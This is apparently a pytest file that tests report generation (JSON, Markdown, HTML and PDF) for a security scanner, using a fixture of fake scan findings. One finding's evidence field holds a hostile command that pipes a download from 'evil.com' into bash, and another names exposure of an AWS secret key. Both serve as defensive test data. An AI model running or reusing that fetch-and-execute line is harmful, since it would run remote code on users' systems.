import tempfile
from pathlib import Path

from security_scanner.models import ScanResult, DetectionFinding, SeverityCounts
from security_scanner.reporting import JSONReport, MarkdownReport, HTMLReport, PDFReport, HAS_REPORTLAB


def _make_result() -> ScanResult:
    f1 = DetectionFinding(
        id="f1", severity="CRITICAL", score=95.0,
        file_path=Path("test.py"), line=10,
        description="Remote code execution via os.system",
        category="command_injection",
        evidence='os.system("curl http://evil.com | bash")',
        detected_terms=["os.system", "curl", "bash"],
        recommendation="Avoid os.system, use subprocess with sanitized args",
    )
    f2 = DetectionFinding(
        id="f2", severity="HIGH", score=75.0,
        file_path=Path(".env"), line=5,
        description="Sensitive env key exposed",
        category="exfiltration",
        evidence="AWS_SECRET_ACCESS_KEY=***",
        detected_terms=["AWS_SECRET_ACCESS_KEY"],
        recommendation="Rotate the key and remove from .env",
    )
    return ScanResult(
        scan_id="test-scan",
        timestamp="2025-01-01T00:00:00",
        target=Path("/project"),
        duration_ms=1234,
        total_files=50,
        findings=[f1, f2],
        severity_counts=SeverityCounts(critical=1, high=1),
        correlations=[
            {
                "id": "CORR-test",
                "name": "Test Correlation",
                "severity": "CRITICAL",
                "score": 95.0,
                "description": "Correlated finding chain",
                "rule_id": "CORR-001",
                "finding_ids": ["f1", "f2"],
            }
        ],
        risk_score=95.0,
    )


class TestJSONReport:
    def test_generate(self):
        r = JSONReport()
        text = r.generate(_make_result())
        assert '"scan_id"' in text
        assert '"test-scan"' in text
        import json
        data = json.loads(text)
        assert data["total_findings"] == 2

    def test_save(self, tmp_path):
        r = JSONReport()
        out = tmp_path / "report"
        result = r.save(_make_result(), out)
        assert result.suffix == ".json"
        assert result.exists()


class TestMarkdownReport:
    def test_generate(self):
        r = MarkdownReport()
        text = r.generate(_make_result())
        assert "Security Scan Report" in text
        assert "CRITICAL" in text
        assert "Correlations" in text
        assert "Remote code execution" in text
        assert "Test Correlation" in text

    def test_save(self, tmp_path):
        r = MarkdownReport()
        out = r.save(_make_result(), tmp_path / "report.md")
        assert out.exists()


class TestHTMLReport:
    def test_generate(self):
        r = HTMLReport()
        text = r.generate(_make_result())
        assert "<html" in text.lower()
        assert "CRITICAL" in text
        assert "Remote code execution" in text
        assert "Correlations" in text

    def test_save(self, tmp_path):
        r = HTMLReport()
        out = r.save(_make_result(), tmp_path / "report.html")
        assert out.exists()


class TestPDFReport:
    def test_generate_bytes(self):
        if not HAS_REPORTLAB:
            return
        r = PDFReport()
        data = r.generate_bytes(_make_result())
        assert data.startswith(b"%PDF")
        assert len(data) > 100

    def test_generate_no_reportlab(self, monkeypatch):
        monkeypatch.setattr("security_scanner.reporting.pdf_report.HAS_REPORTLAB", False)
        r = PDFReport()
        try:
            r.generate_bytes(_make_result())
            assert False, "should raise"
        except ImportError:
            pass

    def test_save(self, tmp_path):
        if not HAS_REPORTLAB:
            return
        r = PDFReport()
        out = r.save(_make_result(), tmp_path / "report.pdf")
        assert out.exists()
        assert out.read_bytes()[:4] == b"%PDF"
